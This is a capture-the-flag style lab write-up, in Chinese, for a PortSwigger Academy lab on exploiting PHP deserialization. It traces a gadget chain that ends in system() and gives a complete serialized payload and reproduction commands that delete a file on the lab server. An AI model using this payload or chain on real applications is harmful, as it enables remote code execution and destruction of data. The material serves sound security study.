---
title: "lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization"
links:
  - target: deserialization-family
    relation: evidences
---

# lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization

> evidences: [[deserialization-family]]

- 题面:Developing a custom gadget chain for PHP deserialization(/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)
- 实例:https://0a1c00230387b985832b0ba300ce00d3.web-security-academy.net (`wiener:peter`)
- 判定目标:删除 `/home/carlos/morale.txt`;状态:**solved**(批 32,实例 banner 翻牌 + solved_check true)

## 关键收官:卡点是**长度算错一位**

批 10 的 payload 用了 `s:32:"%00CustomTemplate%00default_desc_type"`,但私有属性名长度是
`strlen("\0CustomTemplate\0")=16` + `strlen("default_desc_type")=17` = **33**。声明 32 与实际 33 不符 →
PHP `unserialize()` 直接返回 false → 500 `Uncaught Exception: unserialize() failed`(即批 10 观察到的现象,
是**载荷非法**而非链不通)。改成 `s:33:` 后:unserialize 成功 → `__wakeup` 触发 RCE,应用随后才在
`index.php:7` 抛 `Invalid user`(顶层非 `User` 的正常拒绝,但 `__wakeup` 已在 unserialize 内跑完)。

> 教训:PHP 序列化串里 **声明的字符串长度必须严格等于字节数**(含 NUL);差一即整体 false。
> `phpser` 只做 `%00` 展开、**不重算长度**,长度要自己数(私有/保护属性 = 1+类名长+1+属性名长)。

## 链(源码自 `/cgi-bin/libs/CustomTemplate.php~`)

- `CustomTemplate{private $default_desc_type; private $desc;}`:`__wakeup()` → `build_product()` →
  `new Product($this->default_desc_type, $this->desc)`。
- `Product::__construct($t,$desc){ $this->desc = $desc->$t; }`(动态属性访问 → 触发 `__get`)。
- `DefaultMap{private $callback}`:`__get($n){ return call_user_func($this->callback,$n); }`。

顶层 `CustomTemplate`(`default_desc_type`=命令,`desc`=`DefaultMap{callback:"system"}`)
→ wakeup → `Product` → `$desc->{'rm /home/carlos/morale.txt'}` → `DefaultMap::__get` → `system(cmd)`。

## 复现命令

```
lab_http get "<inst>/cgi-bin/libs/CustomTemplate.php~"                 # 源码(200 text/plain)
phpser 'O:14:"CustomTemplate":2:{s:33:"%00CustomTemplate%00default_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"%00CustomTemplate%00desc";O:10:"DefaultMap":1:{s:20:"%00DefaultMap%00callback";s:6:"system";}}' --raw-file /tmp/p.bin
# 用 base64 覆盖 Cookie: session=<base64>,请求 /my-account(应用会 500 "Invalid user",但 RCE 已发生)
solved_check "<inst>/" --jar <jar>   -> {"solved":true,...}
```

## 证据摘录

```
GET /cgi-bin/libs/CustomTemplate.php~ -> 200 text/plain(全部 gadget 类)
Cookie: session=<base64 payload> GET /my-account -> 500
  "Uncaught Exception: Invalid user  in /var/www/index.php:7"
solved_check -> {"congrats_line":"<h4>Congratulations, you solved the lab!</h4>","solved":true}
```
